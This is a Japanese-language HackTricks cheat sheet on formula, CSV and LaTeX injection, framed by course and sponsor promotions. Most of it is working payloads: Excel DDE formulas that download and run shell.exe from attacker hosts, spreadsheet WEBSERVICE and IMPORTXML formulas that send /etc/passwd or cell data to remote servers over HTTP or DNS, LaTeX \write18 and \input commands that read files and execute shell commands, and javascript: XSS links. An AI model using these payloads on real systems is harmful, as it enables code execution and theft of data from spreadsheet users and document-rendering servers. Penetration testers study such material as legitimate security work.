# フォーミュラ/CSV/Doc/LaTeX/GhostScript インジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

脆弱性を迅速に特定し、修正する。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、テクノロジースタック全体にわたる問題を見つけ出す。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## フォーミュラインジェクション

### 情報

あなたの**入力**が**CSVファイル**内で**反映されている**場合（または**Excel**で開かれる可能性のある他のファイル）、ユーザーがファイルを**開いたとき**やExcelシート内のリンクを**クリックしたとき**に**実行される**Excelの**フォーミュラ**を挿入することができるかもしれません。

{% hint style="danger" %}
現在、**Excelは**外部から何かがロードされたときにユーザーに**警告**します（何度も）悪意のある行動を防ぐためです。したがって、最終的なペイロードには、特別なソーシャルエンジニアリングが必要です。
{% endhint %}

### [ワードリスト](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### ハイパーリンク

**以下の例は、最終的なExcelシートからの内容の流出を行い、任意の場所へのリクエストを実行するのに非常に有用です。しかし、ユーザーがリンクをクリックし（警告プロンプトを受け入れる必要があります）。**

[https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) からの例

学校の学生記録管理システムの攻撃シナリオを想定しましょう。アプリケーションは教師が学校の学生の詳細を入力することを許可しています。攻撃者はアプリケーションにアクセスし、アプリケーションを使用するすべての教師を危険にさらしたいと考えています。そこで攻撃者は、Webアプリケーションを介してCSVインジェクション攻撃を試みます。
攻撃者は他の学生の詳細を盗む必要があります。そこで攻撃者はハイパーリンク式を使用し、学生の詳細を入力する際にそれを入力します。

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

教師がCSVをエクスポートしてハイパーリンクをクリックすると、機密データが攻撃者のサーバーに送信されます。

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

エクスポートされたCSVファイルには悪意のあるペイロードが含まれています。

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

学生の詳細は攻撃者のWebサーバーに記録されています。

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

この例が機能するためには、**以下の設定を有効にする必要があります**：\
ファイル → オプション → 信頼センター → 信頼センターの設定 → 外部コンテンツ → 動的データ交換サーバーの起動を有効にする\
または**古いExcelバージョン**の使用。

良いニュースは、**このペイロードはファイルが開かれたときに自動的に実行される**ことです（ユーザーが警告を受け入れた場合）。

以下のペイロードで計算機を実行することが可能です **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### さらに
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* これにより、ローカルの /etc/passwd ファイルの最初の行が読み取られます: `='file:///etc/passwd'#$passwd.A1`
* それを抽出します: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* 複数行を抽出する: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS抽出: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**DNS抽出ペイロードの分析:**

* ‘file:///etc/passwd’#$passwd.A19 – ローカルの /etc/passwd ファイルの19行目を読み取ります
* ENCODEURL(‘file:///etc/passwd’#$passwd.A19) – 返されたデータをURLエンコードします
* MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41) – substringに似ていますが、1文字目から41文字目までのデータを読み取ります – DNSホスト名の長さを制限する非常に便利な方法です（FQDNの最大文字数は254文字、ラベル（例：サブドメイン）は63文字）
* SUBSTITUTE(MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41),”%”,”-“) – URLエンコーディングからの特殊文字である%のすべてのインスタンスをダッシュに置き換えます – これにより、有効なDNS文字のみが使用されることを保証します
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41),”%”,”-“)),”.\<FQDN>”) – 上記の処理が行われた後のファイルからの出力をFQDN（ドメインに対して権限を持つホストにアクセスできる）と連結します
* WEBSERVICE – 存在しないDNS名に対してリクエストを行い、その後、制御を持つDNS権威名サーバーのログ（またはtcpdumpなど）を解析します

### Google Sheets OOB Data Exfiltration

まず、いくつかの興味深い関数を紹介しましょう。

**CONCATENATE**: 文字列を互いに追加します。
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: XML、HTML、CSV、TSV、RSSおよびATOM XMLフィードを含む様々な構造化データタイプからデータをインポートします。
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: RSSまたはATOMフィードをインポートします。
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: HTMLページ内のテーブルまたはリストからデータをインポートします。
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: 指定されたスプレッドシートからセル範囲をインポートします。
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE**: セルに画像を挿入します。
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## LaTeX インジェクション

通常、インターネット上で見つかる **LaTeX コードを PDF に変換する** サーバーは **`pdflatex`** を使用します。\
このプログラムはコマンド実行を（不）許可するために3つの主要な属性を使用します：

* **`--no-shell-escape`**: texmf.cnf ファイルで有効になっていても、`\write18{command}` 構造を **無効にする**。
* **`--shell-restricted`**: `--shell-escape` と同じですが、**制限された** '安全な' **事前定義された** コマンドのセットに限定されます（**Ubuntu 16.04 ではリストは `/usr/share/texmf/web2c/texmf.cnf` にあります**）。
* **`--shell-escape`**: `\write18{command}` 構造を **有効にする**。コマンドは任意のシェルコマンドにすることができます。この構造は通常、セキュリティ上の理由から許可されていません。

しかし、コマンドを実行する他の方法があるため、RCE を避けるためには `--shell-restricted` の使用が非常に重要です。

### ファイル読み取り <a href="#read-file" id="read-file"></a>

インジェクションを調整するために、\[ や $ などのラッパーが必要になる場合があります。
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### 単一行ファイルの読み取り
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### 複数行のファイルを読む
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### ファイル書き込み <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### コマンド実行 <a href="#command-execution" id="command-execution"></a>

コマンドの入力はstdinにリダイレクトされます。それを取得するために一時ファイルを使用してください。
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
LaTexエラーが発生した場合は、不正な文字なしで結果を得るためにbase64の使用を検討してください。
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### クロスサイトスクリプティング <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)より
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

TODO: [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) から最も関連性の高い情報とテクニックの要約を作成してください。

## 参考文献

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

より重要な脆弱性を素早く見つけて修正しましょう。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムに至るまでの技術スタック全体で問題を見つけ出します。今日から[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローに学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>
